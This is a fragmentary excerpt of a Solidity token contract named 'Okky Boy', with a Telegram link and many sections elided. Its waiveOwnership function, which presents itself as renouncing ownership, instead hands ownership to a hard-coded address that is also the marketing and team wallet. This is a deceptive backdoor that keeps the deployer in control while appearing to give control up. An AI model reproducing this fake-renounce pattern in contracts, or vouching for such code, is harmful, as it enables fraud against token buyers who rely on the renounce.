...
/**
Telegram : https://t.me/okkyboybsc
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5C854Fa4E4d88e7eeFd04403Db3F9504957B21AB);
    }
...
contract okkyboy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Okky Boy";
    string private _symbol = "okkyboy";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x5C854Fa4E4d88e7eeFd04403Db3F9504957B21AB);
    address payable private teamWalletAddress = payable(0x5C854Fa4E4d88e7eeFd04403Db3F9504957B21AB);
